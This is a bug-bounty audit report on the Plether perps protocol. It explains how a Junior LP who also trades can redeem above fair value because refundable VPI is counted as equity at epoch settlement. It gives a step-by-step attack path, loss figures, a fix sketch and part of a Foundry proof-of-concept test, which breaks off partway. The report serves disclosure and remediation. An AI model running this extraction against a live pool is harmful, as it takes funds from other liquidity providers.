# \#99337 [SC-Critical] Refundable positive VPI is counted as Junior equity at LP epoch settlement, letting a Junior LP who also trades redeem above fair value

**Submitted on Nov 13th 2026 at 08:21:32 UTC by @tomX0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99337
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

A trade that increases skew pays a positive VPI charge into the pool. That cash becomes part of `HousePool.totalAssets()`, and `buildReconcileSnapshot` counts it as distributable LP equity. But the same position gets the charge back when it later closes and brings skew back down, and the lifetime clamp in `CloseAccountingLib` caps that refund at exactly the position's positive `vpiAccrued`. Reconcile never books the refund as a liability.

LP epoch settlement prices matured Junior redemptions and deposits straight after reconcile, from `juniorPrincipal`. So if a skew-increasing position is open when the epoch settles, its refundable charge is baked into the Junior share price.

An account that is both a Junior LP and a trader can use this:

1. Deposit into the Junior vault at fair NAV.
2. Request redemption of those shares.
3. Open a skew-increasing position just before the redemption matures.
4. Let anyone, for example an unrelated keeper, call the permissionless `OrderRouter.settleLpEpoch`.
5. Close the position after settlement and get the charge back.
6. Claim the redemption, which was priced above fair value.

The attacker collects its share of the charge through the redemption and nearly all of the charge again through the close. The other Junior holders pay for both.

Everything goes through public entrypoints: `TrancheVault.requestDeposit` / `claimDeposit`, `requestRedeem` / `claimRedeem`, `OrderRouter.commitOrder` and `OrderRouter.settleLpEpoch`. No privileged role, governance action, oracle control or reentrancy is involved.

In a Foundry test built on the repository's own fixture, a Junior incumbent that only deposited and redeemed finished 447.957052 USDG below its no-trade control after a single cycle, which also puts it below its own deposit. On a 20M pool over eight cycles in about 24 hours, the Junior incumbents lost 67,463.818349 USDG against control.

## Target

- **Asset:** `HousePool.sol` (holds active LP USDG), together with the Junior `TrancheVault` deposit and redemption pricing it drives
- **Commit:** `a82d4fefb02768e5b3bddcc97dee371eee24fea8`
- **Affected code:**
  - `packages/perps/src/libraries/HousePoolAccountingLib.sol`: `buildReconcileSnapshot`, lines 60-78 (main defect)
  - `packages/perps/src/CfdEngineProtocolLens.sol`: `getHousePoolInputSnapshot`, lines 63-64
  - `packages/perps/src/TerminalNavBookV2.sol`: `_terminalLpPriceDeltaAssetAtoms`, lines 320-349
  - `packages/perps/src/libraries/CloseAccountingLib.sol`: lifetime VPI clamp, lines 112-118
  - `packages/perps/src/libraries/CfdEnginePlanLib.sol`: net-rebate close, lines 1059-1068
  - `packages/perps/src/HousePool.sol`: `settleLpEpoch` / `_settleLpEpoch`, lines 809-819, 835-840, 915 and 1147-1152
  - `packages/perps/src/OrderRouter.sol`: `settleLpEpoch`, lines 479-484

## Vulnerability details

### 1. Reconcile has no VPI term

```solidity
// HousePoolAccountingLib.sol:60-78
function buildReconcileSnapshot(
    HousePoolEngineViewTypes.HousePoolInputSnapshot memory engineSnapshot
) internal pure returns (ReconcileSnapshot memory snapshot) {
    uint256 terminalAssets = engineSnapshot.physicalAssets;
    uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
    int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
    if (terminalDelta >= 0) {
        terminalAssets += uint256(terminalDelta);
    } else {
        terminalLiabilities += uint256(-(terminalDelta + 1)) + 1;
    }

    if (terminalAssets >= terminalLiabilities) {
        snapshot.distributable = terminalAssets - terminalLiabilities;
    } else {
        snapshot.deficit = terminalLiabilities - terminalAssets;
    }
}
```

Where the inputs come from:

- `physicalAssets` is the pool's `totalAssets()` (`CfdEngineProtocolLens.sol:63-64`). The VPI charge collected at open is already in it. `WHITEPAPER.md:411-413` says the same thing: positive VPI increases physical pool assets.
- `terminalLpPriceDeltaAssets` comes from `TerminalNavBookV2` (`:320-349`), which computes `slope * markPrice + intercept` over the radix coefficients. It only covers mark-to-market price PnL.
- `traderClaimBalanceAssets` only covers trader claims that are already owed.

Nothing on either side accounts for the VPI refund the open position is still entitled to.

### 2. The refund is fixed at open and paid on close

```solidity
// CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

When the position closes and returns skew to where it was, the VPI curve produces a rebate about the size of the open charge, and the clamp caps it at the position's `vpiAccrued`. So the amount the position will get back is known the moment it opens.

When a close nets a rebate, no close charge is assessed (`CfdEnginePlanLib.sol:1059-1068`), so the close-leg execution fee is not sent to the treasury. It stays in the pool and is netted against the rebate. That trims the attacker's profit a little but doesn't stop anything.

In the PoC, the close preview showed a VPI delta of -1,597.602497 against an open charge of 1,597.522618. The trader received +1,277.649554 (the refund minus the 4 bp close fee the pool keeps), and pool cash dropped by the same amount. Nothing was waived.

### 3. Settlement prices LP flows after reconcile, while the position is still open

```solidity
// HousePool.sol:835-840
_reconcile(accountingSnapshot, statusSnapshot);
_checkpointEngineCarryIndexes();

result.cutoffEpoch = cutoffEpoch;
RedemptionPhase memory juniorPhase;
juniorPhase.pricingPrincipal = juniorPrincipal;
```

Junior deposits settled in the same call are priced the same way (`HousePool.sol:915`, `juniorDepositPhase.pricingAssets = juniorPrincipal`). Live redemptions pay no exit fee, because `_settlementFeeBps` returns 0 when the oracle isn't frozen (`HousePool.sol:1147-1152`).

### 4. Settling with an open position is a normal public path

With positions open, `HousePool.settleLpEpoch` only checks that the caller is the engine's order router and that the mark is the fresh one it just set (`HousePool.sol:809-819`). `OrderRouter.settleLpEpoch` (`:479-484`) is permissionless and satisfies both. A keeper settling the epoch while the attacker's position is open is ordinary operation.

Put simply: the protocol treats a refundable liability as Junior equity, and the price at which other people enter and leave the Junior tranche is taken while that refund is still outstanding.

## Attack path

The numbers below come from the main one-cycle test: a Junior-only pool with a 1,000,000 USDG incumbent and a 1,000,000 USDG attacker.

1. **Deposit at fair NAV.** The attacker deposits 1,000,000 USDG into the Junior vault while it holds no position, so its shares are minted at an honest price.
2. **Request redemption.** After the deposit cooldown the attacker requests redemption of all its shares. The request matures at the next hourly epoch boundary. At that point the attacker holds 0.4997 of Junior supply.
3. **Open just before the boundary.** About 60 seconds before the boundary, the attacker commits a LONG and an unrelated keeper executes it. Notional is 799,800 USDG, the 0.4 max-skew limit on 2,002,000 USDG of depth minus 1,000 USDG of slack. The open pays a VPI charge of c = 1,597.522618 USDG into the pool. The 4 bp open fee of 319.92 USDG goes to the treasury.
4. **An unrelated keeper settles.** Just after the boundary, a keeper calls `OrderRouter.settleLpEpoch`. Reconcile counts c as distributable, and the matured redemption is priced from the inflated `juniorPrincipal`. The redemption comes out 808.355258 USDG above control, against a first-order estimate of f·c = 798.362747.
5. **Close after settlement.** With the redemption already priced, the attacker closes. The clamp returns the charge minus the close fee the pool keeps. Over the whole trade the attacker's clearinghouse balance moved by only -680.062942 USDG, so it got most of c back.
6. **Claim.** The attacker claims 1,000,808.346110 USDG. Net result: +128.283168 USDG, against -0.009148 in the no-trade control.
7. **Repeat.** One cycle takes about three hours, so it can be run about eight times a day.

The victims don't do anything unusual. They take the loss through the normal request, settle and claim path.

## Impact

"Control" below means the identical flow from the same snapshot, where the attacker only does the LP round trip and doesn't trade. A conservation check (attacker + treasury + keeper + every victim + seed holders, attack minus control) comes out at 0.000000 in each of the runs below. No value is created; the attacker's gain is paid for by the other holders.

- **One cycle, 1M incumbent vs 1M attacker (f = 0.4997, c = 1,597.522618).** The incumbent deposited 1,000,000 and got back 999,552.006388, against 999,999.963440 in control. That is 447.957052 USDG below control and 447.993612 below its own deposit. Because the control leaves the incumbent whole to within 0.04 USDG, the absolute loss is caused entirely by the attack. The attacker netted +128.283168 (control -0.009148) and the treasury took 319.912002.
- **One cycle, 20M pool with 5M of Junior incumbents (f = 0.5999, c = 21,996.500315).** Incumbents got back 4,991,069.575367 against 4,999,479.407008 in control: 8,409.831641 below control and 8,930.424633 below their deposits. The attacker netted +3,847.002142 (control -164.498867).
- **Eight cycles in about 24 hours, same 20M pool.** Every cycle was profitable, from 3,847.002142 in the first to 3,902.748303 in the eighth. Incumbents got back 4,930,290.352492 against 4,997,754.170841 in control: 67,463.818349 below control and 69,709.647508 below their deposits. The attacker's cumulative net was +30,998.201365 against -1,316.207978 in control, a difference of 32,314.409343. The treasury took 35,161.280946.
- **One cycle, 50M pool at the 80% Senior cap with 10M of Junior incumbents (f = 0.5999, c = 51,993.802347).** Incumbents got back 9,978,729.265177 against 9,998,611.755752 in control: 19,882.490575 below control and 21,270.734823 below their deposits. The attacker netted +9,046.162284 (control -438.653465).

In the larger pools the no-trade control isn't exactly whole because the Senior coupon accrues in the fixture. That's why the loss caused by the attack is always measured against control. The control drift is printed in every run.

### A majority Junior share is not needed

If an unrelated trader is already positioned on the same side, a third of Junior supply is enough. In this test the incumbents hold 2,000,000 USDG of Junior across two accounts, and an honest trader opens a 750,000 USDG LONG before the attacker deposits. The attacker then deposits 1,000,000 USDG at fair NAV (f = 0.3330) and adds a 450,300 USDG LONG before maturity. Total skew is 0.3996 of depth, inside the 0.4 cap. The open charge is c = 1,461.967742 and the redemption uplift is 490.678946.

- Incumbents got back 2,000,053.648606 against 2,000,341.715493 in control, so they are 288.066887 USDG worse off.
- The attacker netted +107.699532 (control -0.006098). The same open, closed before settlement, loses 315.846376.
- The honest trader is not the victim. Its PnL was -641.937807 in the attack run and -642.127379 in control.

In this run the incumbents still finish above their deposit in absolute terms, because the honest trader's fees go to the pool, so the claim here is a loss against control rather than an absolute loss. With no other trader in the market, the break-even share is about 0.43 (trader-leg cost of 680.062942 divided by c = 1,597.522618).

### Depositors in the same epoch are also victims

In a depth-neutral run, a third party deposits 1,500,000 USDG into the Junior vault in the same epoch and so buys shares at the inflated price. That depositor gets back 1,499,057.404267 against 1,499,999.989028 in control, a loss of 942.584761. In this run the incumbent actually comes out 179.777873 ahead, but the Junior holders as a group end 762.841631 below what they deposited. The loss lands on whoever transacts at the manipulated price.

### Economics

The attacker's gain is roughly f·c minus the open and close execution fees, minus price and spread cost. In the main run f·c = 798.362747 and each 4 bp leg is 319.92, which leaves 158.522747. The measured net is +128.283168; the remaining ~30 USDG is price and spread cost. The loss to the other Junior holders is the redemption uplift minus the trader payments that stay in the pool: 447.957052 lost against an uplift of 808.355258.

Attacker capital across the runs ranges from 1,013,509 USDG to 62,637,162 USDG. The largest figure is cumulative over eight cycles, with the same stake re-deposited each time.

## Why this is a code defect and not an economic or majority attack

All of the profit comes from one omission: reconcile books no liability for a refund that is already fixed at open and capped by `CloseAccountingLib.sol:116-118`. Book that liability and the transfer disappears.

- No vote, privileged role, market-wide price move or majority stake is involved.
- The attacker gets its Junior share by depositing at fair NAV one cooldown before settlement. It needs no pre-existing stake and is profitable with a 0.3330 share in the sub-majority test.
- The negative control shows the same open and close, finished before settlement, costs the attacker 500.727765 USDG and leaves the incumbent 180.426467 USDG above control. The only difference between the losing run and the profitable run is whether the position is still open when the epoch settles.

## Why this is not a known issue or intended behaviour

**It is not the known depth-manipulation issue.** The AI scan report contains "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate". That mechanism needs pool depth to fall between open and close. This one doesn't, and the depth-neutral test shows it directly:

- A same-size third-party Junior deposit keeps pool depth at close at 10,003 bps of depth at open, i.e. flat.
- The unclamped close curve at close depth is 1,996.975848 against an open charge of c = 1,997.502119, so the refund is already about c and the clamp doesn't need to bind.
- The attacker still nets +362.506407 (control -0.010979), with a redemption uplift of 1,213.013819 against f·c = 1,198.022806.

So the profit comes from how NAV is recognised at reconcile, not from a depth-driven rebate. The listed LP refund-epoch and redemption-rounding findings are unrelated mechanisms (zero-payout refund epochs and rounding). I went through the Cecuro AI audit, the SC Audit Studio pre-audit, the AI scan findings, the collaborative audit and the Cantina report, and none of them covers VPI in LP pricing. I also found no issue, PR or commit in the upstream `Plether-Fi/plether-core` repository that addresses it.

**The documentation doesn't allow this transfer.** The docs describe the NAV definition the code implements, but they don't sanction what happens here:

- `packages/perps/SECURITY.md:859-860` says new LPs should not enter at a higher deposit NAV than the marked-liability discount existing LPs bear. Here they enter at a NAV inflated by a refund that hasn't been paid out yet.
- `SECURITY.md:863` keeps VPI outside the pre-close price book, which is where the code leaves it. The problem is that the collected cash is at the same time inside `physicalAssets`.
- `SECURITY.md:866-867` and `ACCOUNTING_SPEC.md:821-822` give negative lifetime VPI a dedicated nonwithdrawable reserve that LPs can't extract before the matching obligation settles. There is no equivalent protection for the positive charge that the same position can recover on close. That asymmetry is the bug.
- The "unfunded value is waived rather than claim-backed" rule in `SECURITY.md:871-872` and `WHITEPAPER.md:885-888` is a payment-priority rule for when free cash is short. Nothing was waived in any measured run.
- `ACCOUNTING_SPEC.md:738-740` explicitly accepts a timing transfer for pending carry, which can't be reversed. Positive VPI is different: it is refundable up to `vpiAccrued`, and no such allowance is written for it.
- `SECURITY.md:1443` says the lifetime clamp "intentionally zeroes otherwise extractable rebate-only round trips", so the protocol clearly intends VPI round trips not to extract LP value. The VPI limitations list (`SECURITY.md:1434-1444`) does not describe this mechanism.

## Preconditions

- **Junior share.** At settlement the attacker must hold enough Junior supply that its redemption uplift beats the trading cost. Measured working shares are 0.3330 with same-side honest flow and 0.4997 to 0.5999 with no other trader. Break-even with no other trader is about 0.43.
- **Same-side flow, sub-majority case only.** The 0.3330 case needs an unrelated same-side position open when the attacker opens (0.2497 of depth in the test). The attacker doesn't control that flow.
- **Room to open.** The open must increase skew and fit under `maxSkewRatio` (0.4 of depth).
- **No offsetting trade.** Nobody may reduce skew between settlement and the attacker's close.
- **Live market.** The market must be live and not oracle-frozen. Live redemptions pay no exit fee.
- **Free cash covers the rebate.** If free pool cash is short, the rebate is partly waived (`CfdEnginePlanLib.sol:973-976`). This never happened in the tests.
- **Price risk.** With f = 0.5997 and 999,800 USDG of notional, the attacker's net turns negative at an adverse close move of 3.97 bp with zero oracle confidence, or 3.62 bp with 1 bp confidence. The position is only open for a few minutes.

## Limitations of the testing

- **Ordering risk.** If a third party sells short half the attacker's size between settlement and the close, the attacker nets -1,610.310353 instead of +347.436539. This run is included only to show that risk. Its conservation check doesn't balance cleanly, so nothing in this report relies on its numbers.
- **Share threshold.** The sub-majority result uses one honest LONG of fixed size, and real order flow isn't modelled. The 0.43 break-even is arithmetic from the main run, not a measured sweep.
- **Price path and basket.** All runs use a flat basket price and the repository's two-feed test basket rather than the six-feed production basket. VPI depends on skew and depth, not on basket composition, but that isn't measured here.
- **Environment.** Tests run against local Foundry state, not a deployed build. Frozen-market and FAD windows, organic order flow, multi-cycle extraction at the 80% Senior cap (only one cycle was run at 50M) and gas costs are not covered.

## Recommended fix

Track live VPI and keep its positive part out of distributable equity until the matching position actually settles.

Concretely, keep a signed running total of live `vpiAccrued` across accounts in `TerminalNavBookV2`, updated on each per-account curve sync (old value out, new value in, zero when the account goes flat). Then, in `CfdEngineProtocolLens.getHousePoolInputSnapshot`, subtract the positive part of that total from `terminalLpPriceDeltaAssets` while positions are open. Net positive live VPI then stays out of Junior equity until the position closes or is liquidated, while net negative live VPI stays unrecognised, as the docs already describe.

Sketch (illustrative, not compiled):

```diff
--- a/packages/perps/src/TerminalNavBookV2.sol
+++ b/packages/perps/src/TerminalNavBookV2.sol
+    mapping(address account => int256 liveVpiAccruedAssets) private _liveVpiAccruedAssets;
+    int256 public totalLiveVpiAccruedAssets;
 ...
     // inside the per-account curve sync, after the position is read:
+    _syncLiveVpi(account); // moves prev -> next in totalLiveVpiAccruedAssets; next = 0 when flat

--- a/packages/perps/src/CfdEngineProtocolLens.sol
+++ b/packages/perps/src/CfdEngineProtocolLens.sol
     snapshot.terminalLpPriceDeltaAssets = terminalSnapshot.terminalLpPriceDeltaAssets;
+    if (terminalSnapshot.hasOpenPositions) {
+        int256 liveVpi = terminalNavBook.totalLiveVpiAccruedAssets();
+        if (liveVpi > 0) snapshot.terminalLpPriceDeltaAssets -= liveVpi;
+    }
```

Things to keep in mind:

- VPI stays LP revenue. Only the point at which it is recognised moves, from open to close or liquidation.
- If `TerminalNavBookV2` is ever replaced while positions are open, the running total has to be seeded from the live positions, or the fix silently starts from zero.
- I built a prototype of this in a separate copy of the tests. The attack runs then fail their attack-premise assertions, while the no-trade control and the fee-routing check still pass. I haven't run the sub-majority variant or the full regression suite against it, and a small residual uplift remains, so please treat it as a direction rather than a finished patch.

If you'd rather not touch the terminal book, a cheaper option is to stop pricing matured Junior deposits and redemptions off a principal that includes unsettled refundable VPI. For example, hold an explicit nonwithdrawable reserve for positive live `vpiAccrued`, mirroring the one that already exists for negative lifetime VPI, or defer epoch pricing while positions with positive live VPI are open.

## Proof of concept

The PoC is one self-contained Foundry test file built on the repository's `BasePerpTest`. No change to `src` is needed.

How it is set up, so nothing looks smuggled in:

- Every actor is an unprivileged EOA created with `makeAddr`. The keeper is unrelated to the attacker; it executes orders and calls `settleLpEpoch`. Victims only ever use `requestDeposit` / `claimDeposit` and `requestRedeem` / `claimRedeem`.
- The only owner calls are in `setUp`, and they only apply the release configuration through the documented timelocks: 4 bp execution fee, 25 bp settlement buffer, 2500 adverse confidence multiplier, 1000e6 minimum open notional, 40M Senior exposure cap and 8000 bp Senior share. No owner, guardian, pauser or oracle-worker action happens during the attack.
- Orders go through `LegacyOrderRouterHarness`, the repository's test-only subclass of the production `OrderRouter`. It builds a production V3 `OrderRequest` with every caller bound at its maximum and delegatecalls the production commit path. Any EOA can submit the same request directly.
- Cheatcodes are limited to `vm.prank`, `vm.startPrank`, `vm.warp`, `vm.roll`, `vm.snapshotState`, `vm.revertToState`, `vm.toString` and `makeAddr`. There is no `vm.store`, `vm.etch`, `vm.mockCall`, `deal`, `vm.load` or `vm.setNonce`. Funding goes through `MockSettlementToken.mint` or the repository's own `_fundTrader` helper.
- Every attack run starts from the same snapshot as its control, so the two differ only in whether the attacker trades and when it closes.

### Running it

From the repository root at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

```bash
git submodule update --init --recursive
cd packages/perps
mkdir -p test/poc
# save the file below as test/poc/VpiNavJuniorExtractionPoC.t.sol
FOUNDRY_FFI=false FOUNDRY_DYNAMIC_TEST_LINKING=true forge test --match-path '**/VpiNavJuniorExtractionPoC.t.sol' -vv
```

All 11 tests pass with solc 0.8.35, via-IR and 200 optimizer runs, as configured in the repository.

### What each test checks

- `test_Attack_UnprivilegedIncumbent_AbsoluteLoss`: the main exploit (1M vs 1M). The incumbent ends below its own deposit and below control, and the redemption uplift matches f·c.
- `test_Control_NoTrade`: the same LP flows with no trade. The incumbent stays whole and the attacker doesn't profit.
- `test_NegControl_SameTradesClosedBeforeSettlement`: the same open and close, finished before settlement. The attacker loses money and the incumbent isn't harmed.
- `test_SubMajorityShare_WithHonestSkew_Profitable`: the attack with a 0.3330 share and honest same-side flow.
- `test_DepthNeutral_DepositorOverpays`: depth held flat by a concurrent deposit. The attack still works and the concurrent depositor overpays.
- `test_PriceSensitivity`: the break-even adverse close move, with and without oracle confidence.
- `test_OrderingRisk_Disclosed`: a third party reduces skew before the attacker's close, and the attacker loses.
- `test_Scale_D20M_S75_f060_RealizedClaims`, `test_Scale_D20M_S75_f060_EightCyclesPerDay_RealizedClaims` and `test_Scale_D50M_S80cap_f060_RealizedClaims`: the 20M one-cycle, 20M eight-cycle and 50M runs, with victims realising through real claims.
- `test_CloseFeeRouting`: the close-leg execution fee stays in the pool when the close nets a rebate.



## Proof of Concept

### VpiNavJuniorExtractionPoC.t.sol

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// =====================================================================================================================
// Proof of concept for the Plether perps LP accounting at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8.
//
// Claim: positive VPI that a skew-increasing open pays into the pool is held as pool cash and is counted as distributable
// Junior NAV at settlement. No liability is booked for the refund that a same-skew close pays back to the same position.
// A Junior LP that holds matured shares, opens before its redemption settles, and closes after settlement redeems at a
// price above fair value. The excess is funded by the other Junior holders.
//
// Code anchors (packages/perps/src at the commit above):
//   libraries/HousePoolAccountingLib.sol:60-78   buildReconcileSnapshot: no liability term for collected positive VPI
//   HousePool.sol:835-840                        _settleLpEpoch: _reconcile, then juniorPhase.pricingPrincipal = juniorPrincipal
//   libraries/CloseAccountingLib.sol:112-117     lifetime clamp: a same-skew close refunds up to the positive vpiAccrued
//   libraries/CfdEnginePlanLib.sol:1059-1068     net-rebate close: no close fee is assessed, so the fee stays in the pool
//
// Actors: all unprivileged EOAs created with makeAddr. The keeper is an unrelated EOA that executes orders and calls the
// permissionless Router.settleLpEpoch. The attacker is a Junior LP that also trades. Victims realize only through
// TrancheVault requestDeposit/claimDeposit and requestRedeem/claimRedeem.
//
// Orders are submitted through LegacyOrderRouterHarness (test/utils), a test-only subclass of the production OrderRouter
// that builds a production V3 OrderRequest with every caller bound at its maximum and delegatecalls the production V3
// commit path. Any EOA can submit the same request.
//
// Setup (owner calls, setUp only): the release configuration is applied through the documented timelocks. This is
// configuration, not an attack step: executionFeeBps 4, settlementBufferBps 25, adverseConfidenceMultiplierBps 2500,
// basketMaxConfidenceRatioBps 10, minOpenNotionalAssets 1000e6, Senior exposure cap 40,000,000e6 and Senior share 8000 bps.
//
// Cheatcodes: vm.prank, vm.startPrank, vm.warp, vm.roll, vm.snapshotState, vm.revertToState, vm.toString, makeAddr.
// No vm.store, vm.etch, vm.mockCall, deal, vm.load or vm.setNonce. EOA funding uses MockSettlementToken.mint or the repo
// helper _fundTrader. Pyth is the repo MockPyth with a flat basket price and 1 bp per-feed confidence unless a test says
// otherwise.
// =====================================================================================================================

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {ICfdEngineAdminHost} from "@plether/perps/interfaces/ICfdEngineAdminHost.sol";
import {ICfdEngineTypes} from "@plether/perps/interfaces/ICfdEngineTypes.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

contract VpiNavJuniorExtractionPoC is BasePerpTest {

    uint256 internal constant VPI_FACTOR = 0.01e18;
    uint256 internal constant LOT = 100e18; // positionSizeQuantum
    uint256 internal constant P0 = 1e8;

    address internal keeper;
    address internal attacker;
    address internal incumbentA;
    address internal incumbentB;
    address internal seniorLp;
    address internal thirdDepositor;
    address internal honestTrader;

    uint256 internal price = P0;
    uint64 internal confE8 = 1e4; // per-feed Pyth confidence, 1e4 = 1 bp at price 1.0

    enum Mode {
        NoTrade, // LP round trip only (control)
        Attack, // open before the redemption boundary, unrelated keeper settles, close
        CloseBeforeSettle // identical open, closed BEFORE the settlement (negative control)
    }

    struct Scn {
        uint256[2] incDep;
        uint256[2] incShares;
        uint256 seniorDep;
        uint256 seniorShares;
    }

    struct Cfg {
        Mode mode;
        uint256 cycles;
        uint256 attackerDeposit;
        uint256 thirdDeposit; // third-party Junior deposit maturing with the attacker's redemption (single cycle)
        uint256 honestShortDiv; // 0 none; n => honest SHORT of size/n between settlement and the attacker's close
        uint256 closePrice; // 0 = flat; otherwise the feed price used for the attacker's close only
        uint256 sizeBps; // fraction of the max-skew size the attacker opens (10_000 = 100%)
        bool victimsExit; // victims realize through request/claim at the end
        uint256 honestSize; // 0 none; otherwise an unrelated honest LONG (size units) opened BEFORE the attacker's deposit
    }

    struct Res {
        // attacker
        int256 attackerNet;
        int256[] cumNet;
        uint256[] cycleC;
        uint256[] cycleF;
        uint256 minted;
        uint256 fWad;
        uint256 vpiC;
        uint256 notional;
        uint256 depthOpen;
        uint256 depthClose;
        uint256 redeemAssets;
        int256 traderLegPnl;
        uint256 stuckShares;
        uint256 stuckValue;
        uint256 elapsed;
        int256 honestVpi;
        uint256 honestNotional; // honest LONG notional (6-dec assets)
        int256 honestPnl; // honest trader wealth change over the whole run
        // fee routing / conservation
        uint256 treasuryDelta;
        uint256 treasuryOpenDelta;
        uint256 treasuryCloseDelta;
        int256 keeperDelta;
        int256 pvVpiDelta;
        uint256 pvFee;
        int256 traderCloseDelta;
        int256 poolCashCloseDelta;
        uint256 tmpTreasury;
        uint256 tmpCh;
        uint256 tmpCash;
        // victims (all realized through TrancheVault claims)
        uint256[2] incRealized;
        uint256[2] incWalletBefore;
        uint256[2] incWalletAfter;
        uint256 seniorRealized;
        uint256 depositorShares;
        uint256 depositorRealized;
        uint256 seedJ;
        uint256 seedS;
    }

    // ------------------------------------------------------------------------------------------------ release params

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: VPI_FACTOR,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    /// @dev No privileged Junior holder: every Junior LP is funded as an EOA through the real vault flow.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        keeper = makeAddr("keeper");
        attacker = makeAddr("attacker");
        incumbentA = makeAddr("incumbent");
        incumbentB = makeAddr("incumbent2");
        seniorLp = makeAddr("seniorLp");
        thirdDepositor = makeAddr("thirdDepositor");
        honestTrader = makeAddr("honestTrader");

        // ---- OWNER CALLS (release alignment only, see header) ----
        ICfdEngineAdminHost.EngineRiskConfig memory ecfg = _engineRiskConfig();
        ecfg.executionFeeBps = 4;
        ecfg.settlementBufferBps = 25;
        engineAdmin.proposeRiskConfig(ecfg);
        IOrderRouterAdminHost.RouterConfig memory rc = _routerConfig();
        rc.adverseConfidenceMultiplierBps = 2500;
        rc.basketMaxConfidenceRatioBps = 10;
        rc.minOpenNotionalAssets = 1000e6;
        routerAdmin.proposeRouterConfig(rc);
        vm.warp(vm.getBlockTimestamp() + 72 hours + 1);
        engineAdmin.finalizeRiskConfig();
        routerAdmin.finalizeRouterConfig();
        _setSeniorCapacity(40_000_000e6, 8000);
        // ---- end owner calls ----

        vm.warp(SETUP_TIMESTAMP + 7 days); // live FX market, no FAD window
        vm.roll(vm.getBlockNumber() + 10);
        _markNow();

        assertEq(engine.executionFeeBps(), 4, "release exec fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(router.minOpenNotionalAssets(), 1000e6, "release min open notional");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share cap");
        assertEq(pool.maxSeniorExposureAssets(), 40_000_000e6, "release senior exposure cap");
    }

    // ------------------------------------------------------------------------------------------------ plumbing

    function _advance(
        uint256 dt
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + dt);
    }

    function _warpTo(
        uint256 t
    ) internal {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(t);
    }

    function _ticks(
        uint256 t
    ) internal view returns (bytes[] memory data) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] = MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), confE8, -8, t, t - 1));
        }
        data = new bytes[](1);
        data[0] = abi.encode(ticks);
    }

    /// @dev Permissionless mark refresh by the unrelated keeper EOA.
    function _markNow() internal {
        bytes[] memory d = _ticks(vm.getBlockTimestamp());
        vm.prank(keeper);
        router.updateMarkPrice(d);
    }

    function _mark() internal {
        _advance(1);
        _markNow();
    }

    /// @dev Permissionless Router.settleLpEpoch by the unrelated keeper EOA (works with open positions).
    function _routerSettle() internal {
        _advance(1);
        bytes[] memory d = _ticks(vm.getBlockTimestamp());
        vm.prank(keeper);
        router.settleLpEpoch(d);
    }

    /// @dev commitOrder by the trader, executeOrder by the unrelated keeper (the keeper bounty is a trader cost).
    function _trade(
        address who,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        vm.prank(who);
        uint64 id = router.commitOrder(side, size, margin, isClose ? 0 : (side == CfdTypes.Side.LONG ? 1 : 2e8), isClose);
        uint256 commitTs = vm.getBlockTimestamp();
        _advance(2);
        bytes[] memory d = _ticks(commitTs + 1);
        vm.prank(keeper);
        router.executeOrder(id, d);
        (uint256 sizeAfter,,,,,,) = engine.positions(who);
        assertEq(sizeAfter, isClose ? 0 : size, "order must execute");
    }

    function _wealth(
        address who
    ) internal view returns (uint256) {
        return settlementToken.balanceOf(who) + clearinghouse.balanceAssets(who);
    }

    function _treasuryBal() internal view returns (uint256) {
        return clearinghouse.balanceAssets(PROTOCOL_TREASURY_ACCOUNT);
    }

    /// @dev Largest lot-aligned notional at price 1.0 with |skew| <= 0.4 * depth, minus 1k USDG slack.
    function _maxSize(
        uint256 depth
    ) internal pure returns (uint256) {
        uint256 cap = depth * 4 / 10;
        uint256 room = cap > 1000e6 ? cap - 1000e6 : 0;
        return (room * 1e12) / LOT * LOT;
    }

    function _inc(
        uint256 i
    ) internal view returns (address) {
        return i == 0 ? incumbentA : incumbentB;
    }

    function _incName(
        uint256 i
    ) internal pure returns (string memory) {
        return i == 0 ? string.concat("incumbentA") : string.concat("incumbentB");
    }

    // ------------------------------------------------------------------------------------------------ LP flows

    function _requestDeposit(
        TrancheVault v,
        address lp,
        uint256 amount
    ) internal returns (uint256 id) {
